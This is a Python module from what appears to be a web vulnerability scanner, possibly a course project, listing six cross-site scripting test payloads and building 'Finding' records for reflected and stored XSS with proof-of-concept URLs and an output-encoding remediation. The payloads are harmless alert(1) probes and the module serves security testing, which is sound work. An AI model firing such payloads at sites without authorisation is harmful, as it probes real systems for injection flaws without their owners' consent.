"""XSS payload list + finding construction helper."""
from __future__ import annotations

from urllib.parse import quote

from webprobe.findings import Finding

PAYLOADS = [
    "<script>alert(1)</script>",
    '"><svg/onload=alert(1)>',
    "'><img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "'\"><script>alert(1)</script>",
]
REM = "Encode user-supplied output (e.g., htmlspecialchars / framework auto-escape)."


def reflected_finding(url: str, param: str, payload: str) -> Finding:
    poc = f"{url}?{param}={quote(payload)}"
    return Finding(
        severity="HIGH", category="xss", finding_type="reflected_xss",
        name="Reflected XSS", url=url, parameter=param, payload=payload,
        evidence="payload reflected unescaped in response body",
        poc_url=poc, remediation=REM,
    )


def stored_candidate_finding(url: str, param: str, payload: str) -> Finding:
    """Stored XSS candidate: payload accepted by an endpoint that may
    later render it on a different page. v2 stub kept symmetric with
    FIT3048_CATEGORY_MAP; activated when the storage-discovery follow-up
    lands in Sprint 3."""
    poc = f"{url}?{param}={quote(payload)}"
    return Finding(
        severity="MEDIUM", category="xss", finding_type="stored_xss_candidate",
        name="Stored XSS candidate", url=url, parameter=param, payload=payload,
        evidence="payload accepted; storage-context follow-up required",
        poc_url=poc, remediation=REM,
    )
